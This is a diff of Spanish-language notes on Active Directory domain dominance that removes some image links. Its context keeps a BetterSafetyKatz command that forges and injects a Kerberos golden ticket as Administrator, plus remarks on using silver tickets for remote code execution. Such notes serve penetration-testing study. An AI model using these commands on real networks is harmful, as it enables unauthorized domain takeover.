@@ -30,7 +30,6 @@ En una máquina que puede llegar al CONTROLADOR DE DOMINIO a través de la red(n
 `C:\BetterSafetyKatz.exe "kerberos::golden 
 /User:Administrator /domain: /sid: /krbtgt: /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"`
 
-![images/Active%20Directory%20Domain%20Dominance/Untitled.png](images/Active%20Directory%20Domain%20Dominance/Untitled.png)
 
 ![images/Active%20Directory%20Domain%20Dominance/Untitled%201.png](images/Active%20Directory%20Domain%20Dominance/Untitled%201.png)
 
@@ -50,9 +49,7 @@ acceso a recursos compartidos en el controlador de dominio:
 
 Se puede utilizar un comando similar para cualquier otro servicio en un equipo. ¿Qué servicios? HOST, RPCSS, WSMAN y muchos más
 
-![images/Active%20Directory%20Domain%20Dominance/Untitled%202.png](images/Active%20Directory%20Domain%20Dominance/Untitled%202.png)
 
-![images/Active%20Directory%20Domain%20Dominance/Untitled%203.png](images/Active%20Directory%20Domain%20Dominance/Untitled%203.png)
 
 Hay varias formas de conseguir RCE utilizando Silver Tickets:
 
